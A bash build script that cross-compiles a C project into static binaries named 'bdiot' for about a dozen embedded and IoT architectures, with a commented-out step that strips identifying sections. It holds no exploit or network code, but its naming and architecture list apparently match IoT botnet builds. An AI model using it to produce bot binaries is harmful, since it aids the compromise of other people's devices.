#!/bin/bash

FLAGS=""

parent_dir="$(dirname "$PWD")"
generic_prefix="${parent_dir}/cross-compile/"

armv4l_prefix="${generic_prefix}armv4l/bin/armv4l-"
armv5l_prefix="${generic_prefix}armv5l/bin/armv5l-"
armv6l_prefix="${generic_prefix}armv6l/bin/armv6l-"
i586_prefix="${generic_prefix}i586/bin/i586-"
m68k_prefix="${generic_prefix}m68k/bin/m68k-"
mips_prefix="${generic_prefix}mips/bin/mips-"
mips64_prefix="${generic_prefix}mips64/bin/mips64-"
mipsel_prefix="${generic_prefix}mipsel/bin/mipsel-"
powerpc_prefix="${generic_prefix}powerpc/bin/powerpc-"
sh4_prefix="${generic_prefix}sh4/bin/sh4-"
sparc_prefix="${generic_prefix}sparc/bin/sparc-"

rm -rf ./bin
mkdir ./bin

compile(){
  prefix="$1"
  arch="$2"
  flags="$3"
  "${prefix}gcc" -std=c99 ${flags} -I./src/ src/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o bin/bdiot."${arch}" -DARCH=\""${arch}"\"
  #"${prefix}strip" bin/bdiot.${arch} -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

FLAGS="-static"

compile "${armv4l_prefix}" "arm4" "${FLAGS}"
compile "${armv5l_prefix}" "arm5" "${FLAGS}"
compile "${armv6l_prefix}" "arm6" "${FLAGS}"
compile "${i586_prefix}" "x86" "${FLAGS}"
compile "${m68k_prefix}" "m68k" "${FLAGS}"
compile "${mips_prefix}" "mips" "${FLAGS}"
compile "${mips64_prefix}" "mps64" "${FLAGS}"
compile "${mipsel_prefix}" "mpsl" "${FLAGS}"
compile "${powerpc_prefix}" "ppc" "${FLAGS}"
compile "${sh4_prefix}" "sh4" "${FLAGS}"
compile "${sparc_prefix}" "spc" "${FLAGS}"
compile "" "x86" "${FLAGS}"

